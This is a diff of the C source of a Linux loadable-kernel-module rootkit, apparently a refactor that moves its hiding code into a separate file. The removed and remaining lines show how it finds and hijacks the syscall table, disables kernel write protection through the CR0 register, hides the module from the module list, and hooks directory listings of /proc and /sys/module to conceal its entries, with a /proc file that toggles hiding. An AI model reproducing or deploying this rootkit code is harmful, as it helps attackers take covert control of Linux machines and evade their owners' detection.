@@ -1,29 +1,12 @@
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/list.h>
-#include <linux/syscalls.h>
-#include <linux/random.h>
-#include <linux/proc_fs.h>
-#include <linux/namei.h>
-
-#include "rootkit.h"
+#include "main.h"
 
 // Static variables
 
-static u8 module_hidden = 0;
+u8 module_hidden = 0;
 
 static struct list_head *module_list;
 
 static struct proc_dir_entry *proc_rootkit;
-
-// Vars for proc manipulation
-int (*orig_proc_iterate_shared)(struct file *, struct dir_context *);
-int (*orig_sys_iterate_shared)(struct file *, struct dir_context *);
-int (*orig_filldir)(struct dir_context *, const char *, int, loff_t, u64,
-                    unsigned);
-int (*orig_sys_filldir)(struct dir_context *, const char *, int, loff_t, u64,
-                        unsigned);
 
 // Vars for syscall hijacking
 static unsigned long *syscall_table;
@@ -50,27 +33,6 @@ void module_unhide(void)
     module_hidden = 0;
 }
 
-// https://stackoverflow.com/a/60564037
-static inline void force_write_cr0(unsigned long cr0)
-{
-    asm volatile("mov %0, %%cr0"
-                 : "+r"(cr0), "+m"(__force_order));
-}
-
-static inline void disable_write_protect(void)
-{
-    unsigned long cr0 = read_cr0();
-    clear_bit(16, &cr0);
-    force_write_cr0(cr0);
-}
-
-static inline void enable_write_protect(void)
-{
-    unsigned long cr0 = read_cr0();
-    set_bit(16, &cr0);
-    force_write_cr0(cr0);
-}
-
 unsigned long *find_syscall_table(void)
 {
     return (unsigned long *)kallsyms_lookup_name("sys_call_table");
@@ -80,7 +42,7 @@ asmlinkage long rk_access(const struct pt_regs *pt_regs)
 {
     const char __user *filename = (const char __user *)pt_regs->di;
     int mode = (int)pt_regs->si;
-    pr_info("Access: %s\n", filename);
+    // pr_info("Access: %s\n", filename);
     return orig_access(pt_regs);
 }
 
@@ -95,6 +57,7 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
 {
     if (strncmp(ubuf, "toggle", MIN(6, count)) == 0)
     {
+        pr_info("Toggle visibility");
         if (module_hidden)
             module_unhide();
         else
@@ -115,36 +78,6 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
     return count;
 }
 
-static int rk_proc_filldir(struct dir_context *ctx, const char *proc_name, int len,
-                           loff_t off, u64 ino, unsigned int d_type)
-{
-    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
-        return 0;
-    return orig_filldir(ctx, proc_name, len, off, ino, d_type);
-}
-
-static int rk_sys_filldir(struct dir_context *ctx, const char *proc_name, int len,
-                          loff_t off, u64 ino, unsigned int d_type)
-{
-    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
-        return 0;
-    return orig_sys_filldir(ctx, proc_name, len, off, ino, d_type);
-}
-
-int rk_proc_iterate_shared(struct file *file, struct dir_context *ctx)
-{
-    orig_filldir = ctx->actor;
-    *(filldir_t *)&ctx->actor = rk_proc_filldir;
-    return orig_proc_iterate_shared(file, ctx);
-}
-
-int rk_sys_iterate_shared(struct file *file, struct dir_context *ctx)
-{
-    orig_sys_filldir = ctx->actor;
-    *(filldir_t *)&ctx->actor = rk_sys_filldir;
-    return orig_sys_iterate_shared(file, ctx);
-}
-
 static const struct file_operations proc_rootkit_fops = {
     .read = rk_proc_read,
     .write = rk_proc_write,
@@ -157,9 +90,6 @@ static int proc_init(void)
     if (!proc_rootkit)
         return -1;
 
-    SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
-    SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);
-
     return 0;
 }
 
@@ -171,9 +101,6 @@ static int proc_clean(void)
         proc_rootkit = NULL;
     }
 
-    UNSET_FOP(iterate_shared, "/proc", orig_proc_iterate_shared);
-    UNSET_FOP(iterate_shared, "/sys/module", orig_sys_iterate_shared);
-
     return 0;
 }
 
@@ -181,10 +108,11 @@ static int __init lkm_rootkit_init(void)
 {
     printk(KERN_INFO "Hello, World!\n");
 
-    if (proc_init())
+    if (proc_init() || hidefs_init())
     {
         proc_clean();
-        return 1;
+        hidefs_clean();
+        return -1;
     }
 
     module_hide();
@@ -206,6 +134,7 @@ static int __init lkm_rootkit_init(void)
 static void __exit lmk_rootkit_exit(void)
 {
     proc_clean();
+    hidefs_clean();
 
     disable_write_protect();
 
@@ -215,11 +144,3 @@ static void __exit lmk_rootkit_exit(void)
 
     printk(KERN_INFO "Goodbye, World!\n");
 }
-
-module_init(lkm_rootkit_init);
-module_exit(lmk_rootkit_exit);
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Thomas");
-MODULE_DESCRIPTION("Hello Module");
-MODULE_VERSION("0.0.1");
